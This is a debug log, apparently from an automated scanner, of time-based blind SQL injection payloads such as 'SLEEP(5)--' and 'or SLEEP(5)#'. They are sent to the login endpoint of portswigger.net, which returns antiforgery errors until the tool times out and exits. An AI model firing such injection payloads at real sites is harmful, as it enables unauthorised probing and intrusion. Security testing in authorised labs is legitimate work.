+2024-08-16 22:08:35,708 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:36,317 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:36,328 - INFO - [22:08:36] Payload testing: SLEEP(5)--
+2024-08-16 22:08:36,341 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:37,969 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:38,543 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:38,563 - INFO - [22:08:38] Payload testing: SLEEP(5)--
+2024-08-16 22:08:38,574 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:40,358 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:40,973 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:41,010 - INFO - [22:08:41] Payload testing: SLEEP(5)--
+2024-08-16 22:08:41,018 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:42,741 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:43,338 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:43,355 - INFO - [22:08:43] Payload testing: SLEEP(5)="
+2024-08-16 22:08:43,364 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:44,990 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:45,497 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:45,561 - INFO - [22:08:45] Payload testing: SLEEP(5)="
+2024-08-16 22:08:45,574 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:47,170 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:47,784 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:47,806 - INFO - [22:08:47] Payload testing: SLEEP(5)="
+2024-08-16 22:08:47,820 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:49,560 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:50,427 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:50,440 - INFO - [22:08:50] Payload testing: SLEEP(5)='
+2024-08-16 22:08:50,451 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:52,244 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:52,569 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:53,202 - INFO - [22:08:53] Payload testing: SLEEP(5)='
+2024-08-16 22:08:53,214 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:55,730 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:56,135 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:57,043 - INFO - [22:08:56] Payload testing: SLEEP(5)='
+2024-08-16 22:08:57,061 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:58,743 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:59,352 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:59,374 - INFO - [22:08:59] Payload testing: or SLEEP(5)
+2024-08-16 22:08:59,383 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:09:00,922 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:09:00,928 - DEBUG - Resetting dropped connection: portswigger.net
+2024-08-16 22:09:03,165 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:09:03,178 - INFO - [22:09:03] Payload testing: or SLEEP(5)
+2024-08-16 22:09:03,189 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:09:04,802 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:09:05,406 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:09:05,448 - INFO - [22:09:05] Payload testing: or SLEEP(5)
+2024-08-16 22:09:05,460 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:09:07,614 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:09:08,223 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:09:08,237 - INFO - [22:09:08] Payload testing: or SLEEP(5)#
+2024-08-16 22:09:08,247 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:09:08,902 - INFO - Starting testing...
+2024-08-16 22:09:08,904 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:09:09,798 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:09:10,137 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:09:10,579 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:09:11,193 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:09:27,115 - INFO - Starting testing...
+2024-08-16 22:09:27,121 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:09:29,295 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:09:32,109 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:09:42,114 - INFO - Error making request: HTTPSConnectionPool(host='portswigger.net', port=443): Read timed out.
+2024-08-16 22:09:42,120 - INFO - Website is not compatible. Exiting.
